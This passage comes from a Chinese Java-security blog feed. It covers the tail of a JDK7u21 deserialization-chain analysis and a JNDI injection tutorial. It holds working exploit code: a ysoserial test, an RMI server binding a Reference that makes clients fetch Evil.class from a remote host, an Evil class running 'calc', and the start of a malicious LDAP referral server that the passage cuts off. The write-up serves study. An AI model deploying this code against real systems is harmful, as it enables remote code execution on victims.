alt="image-20220618182952209"></p><p><code>Reflections.getFirstCtor</code>方法返回<code>AnnotationInvocationHandler</code>对象，然后调用<code>newInstance</code>实例化该对象，传入构造方法中的参数是<code>Override.class</code>和<code>map</code>，这个在cc链学习的时候页接触到过这种传参方式。</p><p>下面这段代码和之前一样通过反射将<code>tempHandler</code>里面的<code>type</code>的变量改成<code>Templates.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> Gadgets.createProxy(tempHandler, Templates.class);</span><br></pre></td></tr></table></figure><p>再来看到下一段代码,跟进一下<code>Gadgets.createProxy</code>方法，主要就最后一行，使用了<code>Templates</code>去做动态代理</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618184148530-1966438151.png" alt="image-20220618184148200"></p><p>等价于下面的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class cls=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Templates templates=(Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),Templates.class.getInterfaces(),invocationHandler);</span><br><span class="line">        Object object=constructor.newInstance(Override.class,templates);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着往下看</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618192149052-791127900.png" alt="image-20220618192148678"></p><p>实例化一个<code>LinkedHashSet</code>对象，并将<code>templates</code>和<code>proxy</code>添加进去。</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>先编写一个测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.Jdk7u21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jdk7u21</span>().getObject(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(calc);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化输出----&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功触发</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618192949304-242290566.png" alt="image-20220618192948825"></p><p>接下来分析下该利用链的具体调用过程，根据yso返回的是<code>LinkedHashSet</code>实例化对象，所以反序列化时先会调用<code>LinkedHashSet#readObject()</code>方法。</p><p>可以看到并没有<code>readObject()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618194947351-181087664.png" alt="image-20220618194946775"></p><p>查看下父类，发现继承了<code>HashSet</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618195104101-641953240.png" alt="image-20220618195103571"></p><p>那么会调用<code>HashSet#readObject()</code>方法，在里面打个断点，这里调用了<code>map.put()</code>方法，跟进一下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618202844926-1706817119.png" alt="image-20220618202844266"></p><p>发现调用的是<code>HashMap#put()</code>方法，这里有个for循环，因为table数组是空的所以并不会进入循环中，下面会调用<code>addEntry</code>,将这几个值添加进去，hash的值为hash方法处理<code>TemplatesImpl</code>的值，key为<code>TemplatesImpl</code>的实例对象，value则是一个空的Object对象，i参数为<code>indexFor</code>方法处理hash后的结果。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618203844306-1455246806.png" alt="image-20220618203843843"></p><p>返回之后，继续调用put方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204410694-552579046.png" alt="image-20220618204410352"></p><p>此时table中有了值，所以进入for循环</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204601345-924320972.png" alt="image-20220618204600793"></p><p>这里的key为代理类，代理类执行方法时，会触发<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法执行</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204744583-1951323441.png" alt="image-20220618204744027"></p><p>这里通过if判断后，会调用<code>equalsImpl()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618205445366-690404709.png" alt="image-20220618205444743"></p><p>进入方法中，可以看到这里会通过反射调用 <code>var1</code> 对象的 <code>var5</code> 方法，此时<code>var1</code>为<code>TemplatesImpl</code>，<code>var5</code>是名为<code>newTransformer</code>的<code>Method</code>对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618211236797-637088163.png" alt="image-20220618211236270"></p><p>那么这里是怎么获取var5的呢，可以看到上面通过<code>getMemberMethods()</code>方法拿到Method类类型的数组，跟进这个方法看一下。通过反射拿到this.type对象的方法，这里的type为<code>templates</code>对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618211429646-1493626930.png" alt="image-20220618211429288"></p><p>这里返回了两个方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618221119175-668285203.png" alt="image-20220618221118759"></p><p>然后拿到这两个方法之后，就会进入for循环，通过<code>var8 = var5.invoke(var1);</code>分别通过反射调用这两个方法，var1就是<code>TemplatesImpl</code>的实例对象。也就是说会调用<code>TemplatesImpl#getOutputProperties()</code>方法，后面的调用步骤和走之前CC链利用<code>TemplatesImpl</code>构造恶意类的调用时一样的。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618212154096-356263688.png" alt="image-20220618212153754"></p><p>往下就是之前<code>TemplatesImpl</code>的调用链了，<code>getOutputProperties</code>方法会去调用<code>newTransformer</code>方法，<code>newTransformer</code>又会去调用<code>getTransletInstance</code>方法。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618212439063-180962652.png" alt="image-20220618212438318"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/14026849.html">https://www.cnblogs.com/nice0e3/p/14026849.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;前面的cc链都是第三方组件的利用链，现在学习下JDK7u21的原生反序列化链。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="利用链" scheme="https://kpa1on.github.io/tags/%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之JNDI注入</title>
    <link href="https://kpa1on.github.io/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/"/>
    <id>https://kpa1on.github.io/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5/</id>
    <published>2022-06-17T02:41:38.000Z</published>
    <updated>2022-06-17T16:13:11.689Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>JNDI注入是反序列化漏洞常用的攻击手法之一。</p><span id="more"></span><h3 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h3><p>JNDI(Java Naming and Directory Interface，Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。两者之间的关键差别是目录服务中对象不但可以有名称还可以有属性（例如，用户有email地址），而命名服务中对象没有属性。</p><p>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作，还可以通过（LDAP）。再提一下RMI：</p><blockquote><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。相当于利用RMI去动态加载类，RMI服务那里绑定了一个对象，然后通过<code>JNDI</code> 去获取RMI对应的绑定的那个对象。</p></blockquote><p>通过得到的RMI服务端那里的对象，然后调用方法，实际上是在RMI服务那边执行的，也就是说这样攻击的是服务端，那如何攻击客户端呢。</p><blockquote><p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p></blockquote><p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，得到的是一个 <code>Reference</code> 类的存根，由于获取的是一个 <code>Reference</code> 实例，客户端会首先去本地的 CLASSPATH 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <a href="http://ip:port/refClassName.class">http://ip:port/refClassName.class</a> 动态加载 classes 并调用 <code>insClassName</code> 的构造函数、静态代码块、getObjectInstance()等。这些地方都可以写入恶意代码。而且这个调用是在客户端，而不是在服务端。这就实现了客户端的命令执行。</p><h3 id="JNDI-RMI代码测试"><a href="#JNDI-RMI代码测试" class="headerlink" title="JNDI+RMI代码测试"></a>JNDI+RMI代码测试</h3><p>客户端代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://42.194.149.25:8111/test&quot;</span>;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>,<span class="string">&quot;42.194.149.25&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">8111</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">feng</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;http://42.194.149.25:8112/&quot;</span>);<span class="comment">//构造出一个Reference对象,第一个className用处不大，第二个参数factory是用来指定类名的，第三个参数就是当CLASSPATH找不到指定的类的时候，去搜索的远程URL路径了。也就是查找http://42.194.149.25:8112/Evil.class</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(feng);</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再写一个<code>Evil.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>Evil.java</code>编译好</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617141531834-1579649378.png" alt="image-20220617141530737"></p><p>运行客户端代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617163834494-1141739286.png" alt="image-20220617163834298"></p><p>这里弄了很久，之前运行一直显示timeout，后面调试发现，在rmi通信的时候是启用了一个随机端口比如44567，vps因为有安全组所以一直连不上，把安全组策略打开即可。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164110192-943870745.png" alt="image-20220617164109795"></p><h3 id="JNDI-RMI调试分析"><a href="#JNDI-RMI调试分析" class="headerlink" title="JNDI+RMI调试分析"></a>JNDI+RMI调试分析</h3><p>在lookup函数处打上断点</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164309402-241499107.png" alt="image-20220617164309349"></p><p>跟进<code>rmiURLContext#lookup</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164322491-1242926316.png" alt="image-20220617164322361"></p><p>通过<code>rmiURLContext#getRootURLContext</code>拿到var2，var2如下，里面把包括远程主机和对应的端口，以及绑定对象的名字</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617164753272-151728509.png" alt="image-20220617164753147"></p><p>继续跟进<code>var3#lookup</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165035151-1967729845.png" alt="image-20220617165035321"></p><p>通过<code>this.registry#lookup</code>方法拿到RMI绑定的对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165354472-424846252.png" alt="image-20220617165354526"></p><p>向下，跟进<code>decodeObject()</code>方法</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617165531472-280695840.png" alt="image-20220617165531724"></p><p>这里先判断var1是否是<code>ReferenceWrapper</code>类的对象，它<code>implements RemoteReference</code>了，所以会调用<code>getReference()</code>，获取<code>Reference</code>对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617172709689-478528339.png" alt="image-20220617172709570"></p><p>进入<code>NamingManager.getObjectInstance</code>，前面通过一些if语句的判断，重点是下面这几行代码</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617172958332-1022715033.png" alt="image-20220617172958249"></p><p>跟进<code>getObjectFactoryFromReference()</code>函数，<code>clas = helper.loadClass(factoryName);</code>这里是本地类加载，因为找不到<code>Evil</code>类所以会加载失败。继续往下在<code>codebase = ref.getFactoryClassLocation()</code>中，<code>FactoryClassLocation</code>就是我们请求的URL，并赋值给<code>codebase</code>，下面就通过<code>URLClassLoader</code>远程加载类，跟进<code>loadClass()</code>方法，获取<code>URLClassLoader</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617174419754-846853933.png" alt="image-20220617174420127"></p><p>再跟进<code>loadClass()</code>方法，可以看到这里用<code>Class.forName</code>加载类且第二个参数是true（默认也是true）会进行类的加载，也就是静态代码块。因此这时候静态代码块的代码可以执行。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617174351473-1380822828.png" alt="image-20220617174351661"></p><p>成功加载到了clas后，再<code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code>，调用它的newInstance()进行实例化，从而调用了无参构造器，执行了无参构造器里面的代码，因此可以将恶意代码放入无参构造器中。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617173457303-1784389861.png" alt="image-20220617173457054"></p><p>回到<code>getObjectFactoryFromReference()</code>调用处，继续往下，可以发现还会调用<code>getObjectInstance()</code>方法，因此也可以把代码写到<code>getObjectInstance</code>方法中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617175505587-983781106.png" alt="image-20220617175505727"></p><p>调用链大致如下</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220617182136384-338384993.png" alt="image-20220617182136524"></p><p>JNDI注入利用RMI的话，版本会受到极大的限制。</p><h3 id="JNDI-LDAP代码测试"><a href="#JNDI-LDAP代码测试" class="headerlink" title="JNDI+LDAP代码测试"></a>JNDI+LDAP代码测试</h3><p>LDAP是轻型目录访问协议（英文：Lightweight Directory Access Protocol，缩写：LDAP）是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。</p><p>因为RMI会受到限制，所以就有了JNDI+LDAP的注入方式。</p><blockquote><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。</p></blockquote><p>服务端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAP_Server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8112/#Evil&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8111</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span 